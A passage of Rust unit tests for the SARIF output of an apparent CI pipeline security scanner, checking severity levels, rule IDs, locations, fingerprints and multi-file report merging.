        let sarif = emit_to_string(&graph, &findings);
        let results = sarif["runs"][0]["results"].as_array().unwrap();

        assert_eq!(results[0]["level"], "error"); // Critical
        assert_eq!(results[1]["level"], "error"); // High
        assert_eq!(results[2]["level"], "warning"); // Medium
        assert_eq!(results[3]["level"], "note"); // Low
        assert_eq!(results[4]["level"], "note"); // Info

        // security-severity mirrors the finding severity, not the rule default
        assert_eq!(results[0]["properties"]["security-severity"], "9.0");
        assert_eq!(results[1]["properties"]["security-severity"], "7.5");
        assert_eq!(results[2]["properties"]["security-severity"], "5.0");
        assert_eq!(results[3]["properties"]["security-severity"], "2.0");
        assert_eq!(results[4]["properties"]["security-severity"], "0.1");
    }

    #[test]
    fn result_has_rule_id_message_and_location() {
        let graph = empty_graph();
        let findings = vec![make_finding(
            Severity::High,
            FindingCategory::UnpinnedAction,
            "Unpinned actions/checkout@v4",
        )];

        let sarif = emit_to_string(&graph, &findings);
        let r = &sarif["runs"][0]["results"][0];

        assert_eq!(r["ruleId"], "unpinned_action");
        assert_eq!(r["message"]["text"], "Unpinned actions/checkout@v4");

        let uri = &r["locations"][0]["physicalLocation"]["artifactLocation"]["uri"];
        assert_eq!(uri, ".github/workflows/ci.yml");

        let base = &r["locations"][0]["physicalLocation"]["artifactLocation"]["uriBaseId"];
        assert_eq!(base, "%SRCROOT%");

        // Every result has a stable partialFingerprint for cross-run dedup.
        let fp = r["partialFingerprints"]["primaryLocationLineHash"]
            .as_str()
            .unwrap();
        assert_eq!(fp.len(), 16, "fingerprint should be 16 hex chars");
        assert!(fp.chars().all(|c| c.is_ascii_hexdigit()));
    }

    #[test]
    fn all_finding_categories_have_rule_definitions() {
        // Ensures no category falls back to ruleId="unknown", which breaks
        // GitHub Code Scanning ingestion.
        let categories = [
            FindingCategory::AuthorityPropagation,
            FindingCategory::OverPrivilegedIdentity,
            FindingCategory::UnpinnedAction,
            FindingCategory::UntrustedWithAuthority,
            FindingCategory::ArtifactBoundaryCrossing,
            FindingCategory::FloatingImage,
            FindingCategory::LongLivedCredential,
            FindingCategory::PersistedCredential,
            FindingCategory::TriggerContextMismatch,
            FindingCategory::CrossWorkflowAuthorityChain,
            FindingCategory::AuthorityCycle,
            FindingCategory::UpliftWithoutAttestation,
            FindingCategory::SelfMutatingPipeline,
            FindingCategory::VariableGroupInPrJob,
            FindingCategory::SelfHostedPoolPrHijack,
            FindingCategory::ServiceConnectionScopeMismatch,
            FindingCategory::TemplateExtendsUnpinnedBranch,
            FindingCategory::TemplateRepoRefIsFeatureBranch,
            FindingCategory::VmRemoteExecViaPipelineSecret,
            FindingCategory::ShortLivedSasInCommandLine,
            FindingCategory::SecretToInlineScriptEnvExport,
            FindingCategory::SecretMaterialisedToWorkspaceFile,
            FindingCategory::KeyVaultSecretToPlaintext,
            FindingCategory::TerraformAutoApproveInProd,
            FindingCategory::AddSpnWithInlineScript,
            FindingCategory::ParameterInterpolationIntoShell,
            FindingCategory::RuntimeScriptFetchedFromFloatingUrl,
            FindingCategory::PrTriggerWithFloatingActionRef,
            FindingCategory::UntrustedApiResponseToEnvSink,
            FindingCategory::PrBuildPushesImageWithFloatingCredentials,
        ];

        for cat in categories {
            let id = category_to_rule_id(&cat);
            assert!(
                RULE_DEFS.iter().any(|r| r.id == id),
                "category {cat:?} -> rule id {id:?} has no RuleDef entry"
            );
        }
    }

    #[test]
    fn emit_multi_produces_single_sarif_document() {
        let source_a = PipelineSource {
            file: ".github/workflows/ci.yml".into(),
            repo: None,
            git_ref: None,
            commit_sha: None,
        };
        let source_b = PipelineSource {
            file: ".github/workflows/deploy.yml".into(),
            repo: None,
            git_ref: None,
            commit_sha: None,
        };
        let graph_a = AuthorityGraph::new(source_a);
        let graph_b = AuthorityGraph::new(source_b);

        let findings_a = vec![make_finding(
            Severity::High,
            FindingCategory::UnpinnedAction,
            "Unpinned checkout in ci",
        )];
        let findings_b = vec![make_finding(
            Severity::Critical,
            FindingCategory::AuthorityPropagation,
            "Secret reaches untrusted step in deploy",
        )];

        let mut buf = Vec::new();
        SarifReportSink
            .emit_multi(
                &mut buf,
                &[
                    (&graph_a, findings_a.as_slice()),
                    (&graph_b, findings_b.as_slice()),
                ],
            )
            .unwrap();

        // Must be a single valid JSON document — not two concatenated ones.
        let sarif: serde_json::Value = serde_json::from_slice(&buf)
            .expect("emit_multi must produce a single valid JSON document");

        assert_eq!(sarif["version"], "2.1.0");

        // One run containing both files' results.
        let runs = sarif["runs"].as_array().unwrap();
        assert_eq!(runs.len(), 1, "expected exactly one run");

        let results = runs[0]["results"].as_array().unwrap();
        assert_eq!(results.len(), 2, "expected both files' findings in one run");

        let uris: Vec<&str> = results
            .iter()
            .map(|r| {
                r["locations"][0]["physicalLocation"]["artifactLocation"]["uri"]
                    .as_str()
                    .unwrap()
            })
            .collect();
        assert!(uris.contains(&".github/workflows/ci.yml"));
        assert!(uris.contains(&".github/workflows/deploy.yml"));
    }
}
